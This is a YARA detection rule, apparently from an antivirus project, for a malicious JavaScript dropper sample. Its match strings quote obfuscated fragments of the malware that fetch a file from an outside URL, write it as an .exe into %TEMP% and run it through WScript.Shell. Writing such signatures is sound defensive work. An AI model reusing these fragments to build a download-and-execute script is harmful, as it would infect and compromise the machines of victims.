rule sig_20160330_df2c8a5770d43bc66d8f3e3e88fd434c {
  meta:
    description = "datamaliciousorder - file 20160330_df2c8a5770d43bc66d8f3e3e88fd434c.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "e7fe3585934680a268624f1e7da2be74a8374462598fc6f1dc0440b3d732e1ab"

  strings:
    $s1  = "_S[_LA](\"GET\", \"http://pro.monbento.com/n3iska\", false);" fullword ascii
    $s2  = "function _P0(_Q, _P3){_P1 = _P1 * 1; return _Q - _P3;};" fullword ascii
    $s3  = "var _N = function _CK() {return WScript[_XV](\"WScript\"+\".Shell\");}(), _MU = 11;" fullword ascii
    $s4  = "if (_S[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _AF() {return _N[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"Qvn0HO1i8qPKoDk.ex\" + \"e\";};" fullword ascii
    $s6  = "function _O(){return _DY + \"\";};" fullword ascii
    $s7  = "function _PI() {return ((_FQ == true) && (_FQ == _XN)) ? 1 : _P1;};" fullword ascii
    $s8  = "function _W(_XO){_N[\"Run\"](_XO, _P1, _P1);};" fullword ascii
    $s9  = "function _A(){return 22;};" fullword ascii
    $s10 = "function _I()" fullword ascii
    $s11 = "function _E(_WV) {var _PU = (1, 2, 3, 4, 5, _WV); return _PU;};" fullword ascii
    $s12 = "return _P0(_HP, _W0);" fullword ascii
    $s13 = "function _P(){return _XV;};" fullword ascii
    $s14 = " while (_KI){" fullword ascii
    $s15 = "var _A0 = new this[\"Date\"]();" fullword ascii
    $s16 = "_XN = true; " fullword ascii
    $s17 = "var _XN = false;" fullword ascii
    $s18 = "var _FQ = false;" fullword ascii
    $s19 = "_FQ = true; " fullword ascii
    $s20 = "} catch(_V){};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}